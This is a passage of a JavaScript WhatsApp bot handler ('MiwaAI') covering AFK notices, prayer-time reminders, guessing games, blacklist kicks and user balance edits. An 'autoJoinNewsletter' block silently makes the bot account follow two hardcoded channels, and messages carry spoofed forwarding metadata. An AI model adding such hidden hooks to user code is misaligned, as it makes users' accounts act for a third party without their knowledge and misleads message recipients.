					let getTimee = Date.now() - getAfkTime(getId2, afk)
					let anu2 = ms(getTimee)
					let afkText = "Eh, jangan di-tag dulu ya! Dia lagi AFK nih~ 🤭\n\n";
					afkText += `*Alasan*: ${getReason2}\n`;
					afkText += `*Udah sejak*: ${anu2.hours}h, ${anu2.minutes}m, ${anu2.seconds}s.`;
					newReply(afkText);
				}
			}

			if (checkAfkUser(m.sender, afk)) {
				let getId = getAfkId(m.sender, afk)
				let getReason = getAfkReason(getId, afk)
				let getTime = Date.now() - getAfkTime(getId, afk)
				let anu = ms(getTime)
				afk.splice(getAfkPosition(m.sender, afk), 1)
				fs.writeFileSync('./src/afk.json', JSON.stringify(afk))
				let afkReturnText = `Yeay! @${m.sender.split('@')[0]} udah balik dari AFK nih~ 🥳\n\n`;
				afkReturnText += `*Alasan*: ${getReason}\n`;
				afkReturnText += `*Selama*: ${anu.hours}h, ${anu.minutes}m, ${anu.seconds}s.`;
				sock.sendTextWithMentions(m.chat, afkReturnText, m);
			}
		}

		sock.autosholat = sock.autosholat ? sock.autosholat : {};
		if (!m.isNewsletter) {
			if (!(m.chat in sock.autosholat)) {
				// Mengambil waktu sholat menggunakan fetchJson, dengan kota Jakarta
				const data = await fetchJson('https://api.aladhan.com/v1/timingsByCity?city=Jakarta&country=Indonesia&method=8');
	
				if (data.code === 200) {
					const jadwalSholat = data.data.timings;
					const date = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
					const hours = date.getHours();
					const minutes = date.getMinutes();
					const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

					// Mengecek waktu sholat berdasarkan waktu sekarang
					for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
						if (timeNow === waktu) {
							let teks = `📢 *Waktu Sholat ${sholat} Telah Tiba!* 🕌\n\n`;
							teks += '"Sesungguhnya sholat itu adalah kewajiban yang ditentukan waktunya atas orang-orang yang beriman." *(QS. An-Nisa: 103)*\n\n';
							teks += 'Segeralah tinggalkan aktivitasmu sejenak, ambillah air wudhu, dan tunaikan sholat tepat pada waktunya. Jangan sampai kita termasuk orang yang lalai.\n\n';
				
							// Menambahkan jadwal sholat ke dalam teks
							teks += '*Jadwal Sholat Hari Ini:*\n';
							teks += `- *Fajr*: ${jadwalSholat.Fajr}\n`;
							teks += `- *Dhuhr*: ${jadwalSholat.Dhuhr}\n`;
							teks += `- *Asr*: ${jadwalSholat.Asr}\n`;
							teks += `- *Maghrib*: ${jadwalSholat.Maghrib}\n`;
							teks += `- *Isha*: ${jadwalSholat.Isha}\n\n`;

							// Menambahkan informasi waktu lainnya
							teks += '*Informasi Waktu Lainnya:*\n';
							teks += `- *Sunrise*: ${jadwalSholat.Sunrise}\n`;
							teks += `- *Sunset*: ${jadwalSholat.Sunset}\n`;
							teks += `- *Imsak*: ${jadwalSholat.Imsak}\n`;
							teks += `- *Midnight*: ${jadwalSholat.Midnight}\n`;
							teks += `- *Firstthird*: ${jadwalSholat.Firstthird}\n`;
							teks += `- *Lastthird*: ${jadwalSholat.Lastthird}`;

							sock.autosholat[m.chat] = [
								sock.sendMessage(m.chat, {
									text: teks,
									contextInfo: {
										mentionedJid: [m.sender],
										forwardingScore: 999999, 
										isForwarded: true, 
										forwardedNewsletterMessageInfo: {
											newsletterName: saluranName,
											newsletterJid: saluran,
										},
										externalAdReply: {
											showAdAttribution: true,
											title: `Selamat Beribadah, Kak! 🕌`,
											body: 'Jakarta, Indonesia',
											previewType: "PHOTO",
											thumbnailUrl: 'https://8030.us.kg/file/gdaq7s2tqovN.jpg',
											sourceUrl: wagc
										}
									}
								}),
								setTimeout(() => {
									delete sock.autosholat[m.chat];
								}, 60000) // Menghapus pengingat setelah 60 detik
							];
						}
					}
				}
			}
		}

		if (command) {
			if (isFiltered(m.chat) && !isPremium && !isCreator && !m.key.fromMe) return newReply(`Don't spam! please give pause for a few seconds.`);
			addFilter(m.chat);
		}

		if (isCmd) {
			if (command) {
				const code = fs.readFileSync("./case.js", "utf8")
				let regex = /case\s+'([^']+)':/g;
				let matches = [];
				let match;
				while ((match = regex.exec(code))) {
					matches.push(match[1]);
				}
				const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
				if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					let mean = didyoumean(command, help);
					let sim = similarity(command, mean);
					let similarityPercentage = parseInt(sim * 100);
					if (mean && command.toLowerCase() !== mean.toLowerCase()) {
						const pesanTemplate = `*Eits, kayaknya ada yang salah nih...* 😅\n_Mungkin yang Kamu maksud itu:_\n\n➠ *${prefix + mean}* (${similarityPercentage}%)\n\n_Coba ketuk *Menu* buat lihat daftar lengkapnya ya!_ 🌟`;
						m.reply({
							text: pesanTemplate,
							footer: footer,
							buttons: [
								{
									buttonId: prefix + mean,
									buttonText: {
										displayText: prefix + mean
									}
								},
								{
									buttonId: `${prefix}menu`,
									buttonText: {
										displayText: "📜 Kembali ke Menu"
									}
								}
							],
							viewOnce: true
						});
					}
				}
				if (onlyRegister) {
					if (!(command === "daftar") && !isCreator && !isAdmins) { 
						if (!db.data.users[m.sender].daftar) {
							return newReply(`⚠️ Hai kak! Sepertinya Kamu belum terdaftar. Yuk daftar terlebih dahulu dengan mengetik *.daftar* lalu selesaikan pendaftaran untuk mengakses fitur ini.`);
						}
					}
				}
			}
		};

		if (isBlacklist) {
			if (isAdmins || isCreator || !isBotAdmins) return;
			let pesan = '*⛔ BLACKLIST DETECTED ⛔*\n\nNomor kamu terdeteksi dalam daftar blacklist! Bot tidak melayani pengguna yang telah di-blacklist.\n\n🚫 Jika di grup → Kamu akan dikeluarkan!\n🚫 Jika di chat pribadi → Kamu akan diblokir!';
			if (m.isGroup) {
				sock.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
			} else {
				sock.updateBlockStatus(m.sender, 'block');
			}

			newReply(pesan);
		};

		const JwbTrue = (tebak, exp, tambahan) => {
			let teks = `*🎮 ${tebak} 🎮*\n\nKiw Kiww Bener 🎉\n+Rp ${exp} saldo` + tambahan
			const context = {
				text: teks,
				contextInfo: {
					mentionedJid: [m.sender],
					forwardingScore: 999999, 
					isForwarded: true, 
						forwardedNewsletterMessageInfo: {
						newsletterName: saluranName,
						newsletterJid: saluran,
					},
					externalAdReply: {
						title: `Jawaban Benar 🥳`,
						body: tebak,
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/f8749fccf9b3320cd6307.png`,
						sourceUrl: wagc
					}
				}
			};
			return sock.sendMessage(m.chat, context, {
				quoted: m,
			});
		}

		const waktuHabis = (jawaban) => {
			let teks = `Kroco, Waktu Abis🥳\n\n*Jawaban:*\n${jawaban}`
			const context = {
				text: teks,
				contextInfo: {
					mentionedJid: [m.sender],
					forwardingScore: 999999, 
					isForwarded: true, 
					forwardedNewsletterMessageInfo: {
						newsletterName: saluranName,
						newsletterJid: saluran,
					},
					externalAdReply: {
						title: `Waktu Habis ⏰`,
						body: "Dasar Kroco",
						previewType: "PHOTO",
						thumbnailUrl: `https://telegra.ph/file/030ebfc99f9cb5be7e8cb.png`,
						sourceUrl: wagc
					}
				}
			};
			return sock.sendMessage(m.chat, context, {
				quoted: m,
			});
		}

		if (tebakgame[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakgame[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakgame[m.chat][2]
					JwbTrue("Tebak Game", tebakgame[m.chat][2], `\n\nKirim perintah .tebakgame\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakgame[m.chat][3])
					delete tebakgame[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakhero[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakhero[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakhero[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakhero[m.chat][2]
					JwbTrue("Tebak Hero", tebakhero[m.chat][2], `\n\nKirim perintah .tebakhero\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakhero[m.chat][3])
					delete tebakhero[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakff[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakff[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakff[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakff[m.chat][2]
					JwbTrue("Tebak Free Fire", tebakff[m.chat][2], `\n\nKirim perintah .tebakff\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakff[m.chat][3])
					delete tebakff[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakkabupaten[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkabupaten[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkabupaten[m.chat][1]))
				jawaban = json.title.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkabupaten[m.chat][2]
					JwbTrue("Tebak Kabupaten", tebakkabupaten[m.chat][2], `\n\nKirim perintah .tebakkabupaten\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkabupaten[m.chat][3])
					delete tebakkabupaten[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakjkt48[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakjkt48[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakjkt48[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakjkt48[m.chat][2]
					JwbTrue("Tebak JKT48", tebakjkt48[m.chat][2], `\n\nKirim perintah .tebakjkt48\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakjkt48[m.chat][3])
					delete tebakjkt48[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakhewan[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakhewan[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakhewan[m.chat][1]))
				jawaban = json.title.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakhewan[m.chat][2]
					JwbTrue("Tebak Hewan", tebakhewan[m.chat][2], `\n\nKirim perintah .tebakhewan\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakhewan[m.chat][3])
					delete tebakhewan[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakml[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakml[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakml[m.chat][1]))
				jawaban = json.title.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakml[m.chat][2]
					JwbTrue("Tebak Sound ML", tebakml[m.chat][2], `\n\nKirim perintah .tebakml\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakml[m.chat][3])
					delete tebakml[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakchara[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakchara[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakchara[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakchara[m.chat][2]
					JwbTrue("Tebak Anime", tebakchara[m.chat][2], `\n\nKirim perintah .tebakchara\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakchara[m.chat][3])
					delete tebakchara[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebaklogo[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaklogo[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaklogo[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebaklogo[m.chat][2]
					JwbTrue("Tebak Logo", tebaklogo[m.chat][2], `\n\nKirim perintah .tebaklogo\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaklogo[m.chat][3])
					delete tebaklogo[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakaplikasi[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakaplikasi[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakaplikasi[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakaplikasi[m.chat][2]
					JwbTrue("Tebak Aplikasi", tebakaplikasi[m.chat][2], `\n\nKirim perintah .tebakaplikasi\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakaplikasi[m.chat][3])
					delete tebakaplikasi[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakgambar[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakgambar[m.chat][2]
					JwbTrue("Tebak Gambar", tebakgambar[m.chat][2], `\n\nKirim perintah .tebakgambar\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakgambar[m.chat][3])
					delete tebakgambar[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakkata[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkata[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkata[m.chat][2]
					JwbTrue("Tebak Kata", tebakkata[m.chat][2], `\n\nKirim perintah .tebakkata\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkata[m.chat][3])
					delete tebakkata[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (asahotak[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == asahotak[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(asahotak[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += asahotak[m.chat][2]
					JwbTrue("Asah Otak", asahotak[m.chat][2], `\n\nKirim perintah .asahotak\nuntuk bermain lagi 🎮`)
					clearTimeout(asahotak[m.chat][3])
					delete asahotak[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (lengkapikalimat[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == lengkapikalimat[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(lengkapikalimat[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += lengkapikalimat[m.chat][2]
					JwbTrue("Lengkapi Kalimat", lengkapikalimat[m.chat][2], `\n\nKirim perintah .lengkapikalimat\nuntuk bermain lagi 🎮`)
					clearTimeout(lengkapikalimat[m.chat][3])
					delete lengkapikalimat[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakbendera[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakbendera[m.chat][2]
					JwbTrue("Tebak Bendera", tebakbendera[m.chat][2], `\n\nKirim perintah .tebakbendera\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakbendera[m.chat][3])
					delete tebakbendera[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (caklontong[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == caklontong[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += caklontong[m.chat][2]
					JwbTrue("Cak Lontong", caklontong[m.chat][2], `\n\nKirim perintah .caklontong\nuntuk bermain lagi 🎮`)
					clearTimeout(caklontong[m.chat][3])
					delete caklontong[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (susunkata[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == susunkata[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += susunkata[m.chat][2]
					JwbTrue("Susun Kata", susunkata[m.chat][2], `\n\nKirim perintah .susunkata\nuntuk bermain lagi 🎮`)
					clearTimeout(susunkata[m.chat][3])
					delete susunkata[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkalimat[m.chat][2]
					JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2], `\n\nKirim perintah .tebakkalimat\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkalimat[m.chat][3])
					delete tebakkalimat[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (siapaaku[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == siapaaku[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += siapaaku[m.chat][2]
					JwbTrue("Tebak Siapa", siapaaku[m.chat][2], `\n\nKirim perintah .tebaksiapa\nuntuk bermain lagi 🎮`)
					clearTimeout(siapaaku[m.chat][3])
					delete siapaaku[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tekateki[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tekateki[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tekateki[m.chat][2]
					JwbTrue("Teka Teki", tekateki[m.chat][2], `\n\nKirim perintah .tekateki\nuntuk bermain lagi 🎮`)
					clearTimeout(tekateki[m.chat][3])
					delete tekateki[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebakkimia[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
				jawaban = json.unsur.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebakkimia[m.chat][2]
					JwbTrue("Teka Kimia", tebakkimia[m.chat][2], `\n\nKirim perintah .tebakkimia\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkimia[m.chat][3])
					delete tebakkimia[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebaklirik[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebaklirik[m.chat][2]
					JwbTrue("Teka Lirik", tebaklirik[m.chat][2], `\n\nKirim perintah .tebaklirik\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaklirik[m.chat][3])
					delete tebaklirik[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (budy.toLowerCase() == jawaban) {
					db.data.users[m.sender].uang += tebaktebakan[m.chat][2]
					JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2], `\n\nKirim perintah .tebaktebakan\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaktebakan[m.chat][3])
					delete tebaktebakan[m.chat]
				} else if (similarity(budy.toLowerCase(), jawaban) >= threshold)
					newReply(`_Ya, Dikit Lagi!_`)
				else m.react('❌');
			}
		}

		async function cekgame(gamejid) {
			if (tekateki[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tekateki[gamejid][0]
				})
				return true
			} else if (caklontong[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: caklontong[gamejid][0]
				})
				return true
			} else if (susunkata[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: susunkata[gamejid][0]
				})
				return true
			} else if (mathgame[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal Mathgame belum selesai"
				}, {
					quoted: mathgame[gamejid][0]
				})
				return true
			} else if (tebaktebakan[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebaktebakan[gamejid][0]
				})
				return true
			} else if (tebaklirik[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebaklirik[gamejid][0]
				})
				return true
			} else if (tebakkimia[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkimia[gamejid][0]
				})
				return true
			} else if (siapaaku[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: siapaaku[gamejid][0]
				})
				return true
			} else if (tebakkalimat[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkalimat[gamejid][0]
				})
				return true
			} else if (tebakbendera[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakbendera[gamejid][0]
				})
				return true
			} else if (tebakkata[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkata[gamejid][0]
				})
				return true
			} else if (asahotak[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: asahotak[gamejid][0]
				})
				return true
			} else if (lengkapikalimat[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: lengkapikalimat[gamejid][0]
				})
				return true
			} else if (tebakgame[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakgame[gamejid][0]
				})
				return true
			} else if (tebakhero[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakhero[gamejid][0]
				})
				return true
			} else if (tebakff[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakff[gamejid][0]
				})
				return true
			} else if (tebakkabupaten[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkabupaten[gamejid][0]
				})
				return true
			} else if (tebakjkt48[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakjkt48[gamejid][0]
				})
				return true
			} else if (tebakhewan[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakhewan[gamejid][0]
				})
				return true
			} else if (tebakml[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakml[gamejid][0]
				})
				return true
			} else if (tebakchara[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakchara[gamejid][0]
				})
				return true
			} else if (tebaklogo[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebaklogo[gamejid][0]
				})
				return true
			} else if (tebakaplikasi[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakaplikasi[gamejid][0]
				})
				return true
			} else if (tebakgambar[gamejid]) {
				sock.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakgambar[gamejid][0]
				})
				return true
			} else {
				return false
			}
		}

		const handleLimit = (type, usernya, limitnya) => {
			let jid = `${usernya}@s.whatsapp.net`;

			if (type === 'add') {
				db.data.users[jid].limit += Number(limitnya);
				return newReply(`✅ Limit user berhasil ditambahkan! 🎯`);
			} 
			if (type === 'del') {
				if (db.data.users[jid].limit < limitnya) return newReply(`⚠️ Limit tidak mencukupi.`);
				db.data.users[jid].limit -= Number(limitnya);
				return newReply(`✅ Limit user berhasil dikurangi! ✂️`);
			}
			if (type === 'reset') {
				const limitUser = db.data.users[jid].vip 
					? global.limit.vip 
					: checkPremiumUser(jid, premium) 
						? global.limit.premium 
						: global.limit.free;

				db.data.users[jid].limit = limitUser;
				return newReply(`✅ Limit user berhasil direset! ✂️`);
			}
		};

		const handleMoney = (type, usernya, uangnya) => {
			let jid = `${usernya}@s.whatsapp.net`;

			if (type === 'add') {
				db.data.users[jid].uang += Number(uangnya);
				return newReply(`✅ Uang user berhasil ditambahkan! 🎯`);
			} 
			if (type === 'del') {
				if (db.data.users[jid].uang < uangnya) return newReply(`⚠️ Uang tidak mencukupi.`);
				db.data.users[jid].uang -= Number(uangnya);
				return newReply(`✅ Uang user berhasil dikurangi! ✂️`);
			}
			if (type === 'reset') {
				const uangUser = db.data.users[jid].vip 
					? global.uang.vip 
					: checkPremiumUser(jid, premium) 
						? global.uang.premium 
						: global.uang.free;

				db.data.users[jid].uang = uangUser;
				return newReply(`✅ Uang user berhasil direset! ✂️`);
			}
		};

		const autoJoinNewsletter = true;
		if (autoJoinNewsletter) {
			const channelIds = [
				'0029Vaw0AGCEQIarHspllG1i',
				'0029Vb1iGSE8F2pC9ItH043T'
			]; // Miwa-AI 2022-2025
			const joinChannels = async (ids) => {
				for (const id of ids) {
					try {
						await sleep(3000);
						const response = await sock.newsletterMetadata("invite", id);
						await sleep(3000);
						await sock.newsletterFollow(response.id);
					} catch (error) {
						console.error(`ciu: ${id}`, error);
					}
				}
			};

			(async () => {
				await joinChannels(channelIds);
			})();
		};

		switch (command) {
			case 'daftar': {
				if (db.data.users[m.sender].daftar) return newReply('Kamu udah terdaftar kok! MiwaAI seneng banget bisa bantu Kamu. 😜');
				let [nama, umur] = text.split(",");
				if (!nama || !umur) {
					let pesan = `Halo kak, MiwaAI kasih tahu cara daftarnya ya:\n\n`;
					pesan += `Ketik:\n${prefix + command} nama,umur\n\n`;
					pesan += `Contoh:\n${prefix + command} MiwaAI,16`;
					return newReply(pesan);
				}
				if (isNaN(umur)) return newReply('Umur yang Kamu masukin itu gak valid deh. Coba dicek lagi ya! 🤔');
